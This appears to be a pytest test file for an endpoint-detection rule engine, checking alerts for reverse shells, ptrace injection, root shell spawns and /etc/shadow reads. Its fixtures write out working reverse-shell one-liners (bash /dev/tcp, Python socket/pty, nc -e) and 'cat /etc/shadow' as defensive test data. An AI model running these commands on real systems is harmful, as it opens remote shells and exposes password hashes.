"""
Unit tests for rule_engine.py.

Verifies condition tree evaluation, operator logic (regex, in, equals, gt, lt, and/or/not),
YAML rule parsing from disk, and end-to-end evaluation of all 4 detection rules.
"""

import os
import pytest
from agent.detection.rule_engine import RuleEngine, DetectionAlert


@pytest.fixture
def rules_dir():
    """Returns absolute path to rules directory."""
    test_dir = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(test_dir, "..", "rules")


@pytest.fixture
def engine(rules_dir):
    """Initializes RuleEngine with active rules."""
    return RuleEngine(rules_dir=rules_dir)


class TestRuleEngine:
    def test_load_rules(self, engine):
        """Verify that all standard YAML rules are successfully loaded."""
        assert len(engine.rules) >= 4
        rule_ids = [r["id"] for r in engine.rules]
        assert "RULE-EDR-001" in rule_ids
        assert "RULE-EDR-002" in rule_ids
        assert "RULE-EDR-003" in rule_ids
        assert "RULE-EDR-004" in rule_ids

    def test_reverse_shell_detection_positive(self, engine):
        """Verify positive detection of reverse shell patterns."""
        # 1. Bash /dev/tcp
        event1 = {
            "event_type": "EXECVE",
            "comm": "bash",
            "filename": "/bin/bash",
            "cmdline": "/bin/bash -i >& /dev/tcp/192.168.1.50/4444 0>&1",
            "uid": 1000,
            "ppid": 500,
        }
        alerts1 = engine.evaluate(event1)
        assert len(alerts1) == 1
        assert alerts1[0].rule_id == "RULE-EDR-001"
        assert alerts1[0].severity == "CRITICAL"
        assert alerts1[0].mitre_attack["technique_id"] == "T1059.004"

        # 2. Python one-liner socket shell
        event2 = {
            "event_type": "EXECVE",
            "comm": "python3",
            "filename": "/usr/bin/python3",
            "cmdline": "python3 -c 'import socket,pty; s=socket.socket(); s.connect((\"10.0.0.1\",1337)); pty.spawn(\"/bin/sh\")'",
            "uid": 1000,
        }
        alerts2 = engine.evaluate(event2)
        assert len(alerts2) == 1
        assert alerts2[0].rule_id == "RULE-EDR-001"

        # 3. Netcat reverse shell
        event3 = {
            "event_type": "EXECVE",
            "comm": "nc",
            "filename": "/bin/nc",
            "cmdline": "nc -e /bin/sh 10.0.0.1 4444",
            "uid": 1000,
        }
        alerts3 = engine.evaluate(event3)
        assert len(alerts3) == 1
        assert alerts3[0].rule_id == "RULE-EDR-001"

    def test_reverse_shell_detection_negative(self, engine):
        """Verify benign bash commands do NOT trigger reverse shell rule."""
        benign_event = {
            "event_type": "EXECVE",
            "comm": "bash",
            "filename": "/bin/bash",
            "cmdline": "/bin/bash -c 'echo Hello World && ls -la /tmp'",
            "uid": 1000,
            "ppid": 500,
        }
        alerts = engine.evaluate(benign_event)
        assert len(alerts) == 0

    def test_process_injection_positive(self, engine):
        """Verify positive detection of PTRACE_ATTACH and PTRACE_POKETEXT."""
        event = {
            "event_type": "PTRACE",
            "comm": "malicious_injector",
            "ptrace_request": "PTRACE_POKETEXT",
            "ptrace_request_code": 4,
            "target_pid": 1337,
            "addr": "0x400000",
            "data": "0x90909090",
            "uid": 1000,
        }
        alerts = engine.evaluate(event)
        assert len(alerts) == 1
        assert alerts[0].rule_id == "RULE-EDR-002"
        assert alerts[0].severity == "CRITICAL"
        assert alerts[0].mitre_attack["technique_id"] == "T1055.008"

    def test_process_injection_whitelisted_debugger_negative(self, engine):
        """Verify trusted debuggers like gdb do NOT trigger process injection alert."""
        event = {
            "event_type": "PTRACE",
            "comm": "gdb",
            "ptrace_request": "PTRACE_ATTACH",
            "ptrace_request_code": 16,
            "target_pid": 1337,
            "uid": 1000,
        }
        alerts = engine.evaluate(event)
        assert len(alerts) == 0

    def test_privilege_escalation_positive(self, engine):
        """Verify positive detection of unexpected root shell spawn."""
        event = {
            "event_type": "EXECVE",
            "comm": "sh",
            "filename": "/bin/sh",
            "cmdline": "/bin/sh",
            "uid": 0,
            "ppid": 1005,  # Non-init parent
        }
        alerts = engine.evaluate(event)
        assert len(alerts) == 1
        assert alerts[0].rule_id == "RULE-EDR-003"
        assert alerts[0].severity == "HIGH"
        assert alerts[0].mitre_attack["technique_id"] == "T1068"

    def test_privilege_escalation_negative(self, engine):
        """Verify normal unprivileged shell does NOT trigger privilege escalation."""
        event = {
            "event_type": "EXECVE",
            "comm": "bash",
            "filename": "/bin/bash",
            "cmdline": "/bin/bash",
            "uid": 1000,  # Regular user
            "ppid": 500,
        }
        alerts = engine.evaluate(event)
        assert len(alerts) == 0

    def test_sensitive_file_access_positive(self, engine):
        """Verify positive detection of unauthorized /etc/shadow access."""
        # 1. Openat access
        event1 = {
            "event_type": "OPENAT",
            "comm": "python3",
            "file_path": "/etc/shadow",
            "filepath": "/etc/shadow",
            "flags_desc": "O_RDONLY",
            "uid": 1000,
        }
        alerts1 = engine.evaluate(event1)
        assert len(alerts1) == 1
        assert alerts1[0].rule_id == "RULE-EDR-004"
        assert alerts1[0].severity == "HIGH"
        assert alerts1[0].mitre_attack["technique_id"] == "T1003.008"

        # 2. Execve cat /etc/shadow
        event2 = {
            "event_type": "EXECVE",
            "comm": "cat",
            "filename": "/bin/cat",
            "cmdline": "cat /etc/shadow",
            "uid": 1000,
        }
        alerts2 = engine.evaluate(event2)
        assert len(alerts2) == 1
        assert alerts2[0].rule_id == "RULE-EDR-004"

    def test_sensitive_file_access_whitelisted_negative(self, engine):
        """Verify whitelisted system services (sshd, login, sudo) do NOT trigger alert."""
        event = {
            "event_type": "OPENAT",
            "comm": "sshd",
            "file_path": "/etc/shadow",
            "flags_desc": "O_RDONLY",
            "uid": 0,
        }
        alerts = engine.evaluate(event)
        assert len(alerts) == 0

    def test_custom_rule_operator_logic(self):
        """Verify individual operators: gt, lt, contains, regex_match, in, not_in, and/or/not."""
        engine = RuleEngine()
        custom_rule = {
            "id": "CUSTOM-TEST",
            "title": "Operator Test Rule",
            "severity": "LOW",
            "condition": {
                "and": [
                    {"field": "port", "gt": 1024},
                    {"field": "port", "lt": 65535},
                    {"field": "service", "in": ["http", "https"]},
                    {"field": "path", "contains": "admin"},
                    {"field": "status", "equals": "suspicious"},
                    {"not": {"field": "user", "equals": "root"}},
                ]
            }
        }
        engine.add_rule(custom_rule)

        # Matching event
        match_event = {
            "event_type": "CUSTOM",
            "port": 8080,
            "service": "HTTP",
            "path": "/api/v1/admin/login",
            "status": "suspicious",
            "user": "alice",
        }
        alerts = engine.evaluate(match_event)
        assert len(alerts) == 1
        assert alerts[0].rule_id == "CUSTOM-TEST"

        # Failing event due to port <= 1024
        fail_event = dict(match_event)
        fail_event["port"] = 80
        assert len(engine.evaluate(fail_event)) == 0

        # Failing event due to user == root
        fail_event2 = dict(match_event)
        fail_event2["user"] = "root"
        assert len(engine.evaluate(fail_event2)) == 0
